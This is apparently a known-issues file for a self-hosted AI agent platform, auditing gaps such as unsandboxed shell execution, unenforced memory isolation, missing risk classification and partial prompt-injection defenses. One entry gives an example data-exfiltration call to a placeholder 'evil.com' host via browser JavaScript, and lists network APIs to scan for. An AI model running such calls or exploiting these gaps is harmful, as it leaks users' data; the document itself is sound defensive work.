# Known Issues

Last updated: 2026-02-13 (Post-Phase 4 Audit)

## CRITICAL (Architectural — Not Quick-Fixable)

### Sandbox Not Wired Into Tool Execution
- **Files**: `src/sandbox/`, `src/tools/shell.ts`, `src/tools/claude-code.ts`
- **Description**: Docker sandbox infrastructure exists (container lifecycle, session pool, volume mounting) but is never actually used by tool executors. Shell commands and Claude Code tasks run on the host, not in containers.
- **Impact**: The sandbox provides no isolation benefit in its current state.
- **Resolution**: Requires architectural change — tool executors need a "sandboxed execution" path that routes commands through session-pool containers. This is a non-trivial refactor touching shell.ts, claude-code.ts, and the agent loop.

## HIGH (Functional Gaps)

### Agent Compaction Uses Raw chatId Instead of Namespaced chatId
- **Files**: `src/orchestrator/agent-loop.ts`, `src/agents/session-manager.ts`
- **Description**: When a specialist agent runs, the agent loop uses the raw `chatId` for compaction and conversation tracking, but the session manager uses `agent:{agentId}:{chatId}`. Compacting from a specialist agent could compact the hub/direct conversation instead of the specialist's.
- **Resolution**: Pass the agent-namespaced chatId to `runAgentLoopStreaming`, or accept an optional `agentId` parameter and namespace internally.

### memoryScope: 'isolated' Never Enforced
- **Files**: `src/tools/memory.ts`, `src/memory/store.ts`, `src/agents/agent-config.ts`
- **Description**: The `AgentConfig` schema defines `memoryScope: 'shared' | 'isolated'`, but all memory operations (read, write, search, auto-recall) always use the global `data/memory/MEMORY.md`. The "home" agent template declares `memoryScope: "isolated"` but this is purely decorative.
- **Resolution**: Memory tools need agent-awareness — when invoked for an isolated agent, redirect to `data/memory/agent-{agentId}/MEMORY.md`.

### browser:evaluate Allows Arbitrary JS Including Data Exfiltration
- **Files**: `src/tools/browser.ts`, `src/approval/risk-classifier.ts`
- **Description**: The browser tool's `evaluate` action runs arbitrary JavaScript in the page via CDP. This allows `fetch('https://evil.com', {body: document.body.innerText})` for data exfiltration. The browser tool has no deterministic risk classification (falls through to LLM). Once L2-approved, the expression content is not inspected.
- **Resolution**: Add deterministic classification (`browser:evaluate` = L2 minimum). Scan expression for network APIs (`fetch`, `XMLHttpRequest`, `WebSocket`, `navigator.sendBeacon`).

### Multiple Important Tools Lack Deterministic Risk Classification
- **Files**: `src/approval/risk-classifier.ts`
- **Description**: `write_file`, `delete_file`, `git_commit`, `cron`, `browser`, `skill`, `claude_code`, `memory_write` all fall through to the LLM classifier (Qwen3 8B) instead of having deterministic rules. Suggested levels: `delete_file`=L2, `write_file`=L1, `git_commit`=L2, `claude_code`=L1, `cron:create`=L1, `browser:evaluate`=L2, `skill:install`=L2, `memory_write`=L1.
- **Impact**: LLM misclassification could allow destructive operations without approval.

### OpenRouter Costs Not Tracked in Billing
- **Files**: `src/billing/pricing.ts`, `src/models/openrouter.ts`
- **Description**: `pricing.ts` only has pricing for Claude and `qwen3:8b`. OpenRouter models fall back to `ZERO_PRICING`, making all OpenRouter usage appear free. Meanwhile `openrouter.ts` has its own `MODEL_INFO_MAP` with per-model pricing that is never used by the billing system.
- **Resolution**: Merge OpenRouter pricing into `pricing.ts` or have `calculateCost()` query the OpenRouter provider for unknown models. Add billing hooks to `ModelRegistry.generateWithFailover()`.

## MEDIUM

### MCP Allowlist Not Enforced at Connection Time
- **Files**: `src/tools/mcp-client.ts`
- **Description**: `mcp.allowedServers` config exists but is only checked when listing tools, not when establishing MCP server connections. A server not on the allowlist can still connect; its tools just won't appear.
- **Impact**: Low — tools are the attack surface, and those are filtered. But a cleaner design would reject connections entirely.

### No Rate Limiting on WebChat REST API
- **Files**: `src/messaging/adapters/webchat.ts`
- **Description**: The WebChat adapter has Bearer token auth but no request rate limiting. A valid token holder could flood the endpoint.
- **Impact**: Low for single-user deployments (target audience). Higher if exposed publicly.

### Conversation History Unbounded in Memory
- **Files**: `src/orchestrator/conversation.ts`
- **Description**: Conversation turns accumulate in memory without a hard cap. The compaction system mitigates this at 75% context, but between compactions, memory usage grows linearly.
- **Impact**: Low — compaction triggers well before OOM on typical hardware. Could matter on very constrained devices.

### Browser Sessions Not Auto-Closed on Timeout
- **Files**: `src/browser/launcher.ts`
- **Description**: Browser CDP sessions opened via the browser tool have no idle timeout. If the user opens a browser and never closes it, the Chrome process persists.
- **Impact**: Low — resource leak, not a security issue. Manual `browser_close` works.

### 3-Layer Prompt Injection Defense: Only Layer 2 Code-Enforced
- **Files**: `src/orchestrator/agent-loop.ts`, `src/tools/tool-registry.ts`
- **Description**: The claimed "3-layer" defense (user input, tool output, model response) only has code enforcement on MCP tool outputs (`<mcp_data>` wrapping in `mcp-client.ts`). Layer 1 (user input) is not wrapped in `<user_input>` tags — messages go into conversation as plain strings. Layer 3 (model response) is a system prompt instruction only. Native tool outputs (filesystem, shell, git, search) are also returned as plain strings without `<tool_output>` wrapping.
- **Impact**: MCP outputs (highest risk) are protected. Native tool outputs are lower risk since they come from trusted local operations. The system prompt instruction provides soft defense for the LLM itself.
- **Resolution**: Either wrap all native tool outputs in `<tool_output>` tags in `tool-registry.ts` execute path, or document this as a 2-layer defense (MCP sanitization + system prompt instructions).

### Multi-Agent Executor Ignores agentId
- **Files**: `src/index.ts`, `src/agents/hub.ts`
- **Description**: The agent hub executor callback discards `_agentId`, meaning all specialist agents use the same orchestrator model, system prompt, and tools as the hub. Multi-agent routing differentiates by conversation isolation only, not by actual agent behavior.
- **Resolution**: `runAgentLoopStreaming` should accept `agentId` and use agent-specific config (model, prompt, allowedTools) from `getAgent(agentId)`.

### Agent Sessions Table Defined But Never Queried
- **Files**: `src/db/schema.ts`, `src/agents/session-manager.ts`
- **Description**: The `agent_sessions` table exists in the schema and has a migration, but `session-manager.ts` uses in-memory conversation storage only. The DB table is dead schema.
- **Impact**: No functional impact. Wasted migration. Could confuse contributors.

### No DB Indexes on High-Query Columns
- **Files**: `src/db/schema.ts`
- **Description**: Missing indexes on: `conversations.chat_id` (queried every message), `cronJobs.enabled` + `cronJobs.next_run_at` (queried every 30s), `usageLog.timestamp` + `usageLog.chat_id` (daily aggregates), `memoryChunks.source` (memory search).
- **Impact**: Low for small datasets. Could matter at scale.

### Approval Gate Timeout Not Tested
- **Files**: `src/approval/approval-gate.ts`, test files
- **Description**: No test verifies the promise behavior when `approvalTimeoutMs` expires without user action.
- **Impact**: Low — the feature likely works but is not regression-protected.

### ~80 Tool Strings Not Using i18n t() Function
- **Files**: `src/tools/webhook.ts`, `src/tools/skill.ts`, `src/tools/process.ts`, `src/tools/cron.ts`
- **Description**: Tool validation and response strings (`"Error: 'x' is required for y"`, `"Webhook created: ..."`, etc.) are hardcoded in English instead of using `t()`. Primarily consumed by the LLM orchestrator, not directly shown to users, but inconsistent with the i18n architecture.
- **Impact**: German-locale users see English tool error responses mixed with German UI text.

### ~12 Unsafe `as` Casts in Production Code
- **Files**: `src/tools/claude-code.ts` (7 casts), `src/webhooks/handler.ts` (6 casts), `src/tools/tool-registry.ts` (3 casts)
- **Description**: JSON-parsed values cast with `as string` / `as Record<string, unknown>` without runtime type guards. Could cause subtle runtime errors on malformed input.
- **Impact**: Low for claude-code.ts (controlled JSON stream format). Higher for handler.ts (external webhook payloads).
- **Resolution**: Replace with Zod schemas or runtime type guards (`typeof x === "string"`).

### ~42% Source Files Without Unit Tests
- **Description**: ~40 of ~95 non-test source files lack dedicated tests. Critical untested files include `agent-loop.ts`, `claude-code.ts`, `tool-registry.ts`, and all 16 tool files (`tools/*.ts`).
- **Impact**: Regression risk. Core agent loop and tool execution paths are not regression-protected.

## LOW

### Cron Parser Does Not Validate Day-of-Week / Day-of-Month Conflicts
- **Files**: `src/automation/cron-parser.ts`
- **Description**: Standard cron has undefined behavior when both day-of-week and day-of-month are specified (AND vs OR semantics). Our parser treats them as AND, which may surprise users coming from crontab (which uses OR).
- **Impact**: Minimal — edge case, documented behavior differs from some cron implementations.

### i18n Falls Back Silently to German
- **Files**: `src/i18n/index.ts`
- **Description**: If a translation key is missing in the active locale, it falls back to `de` without logging. This makes it hard to detect missing translations.
- **Impact**: Minimal — only affects en locale since de is the primary. All keys currently exist in both locales.
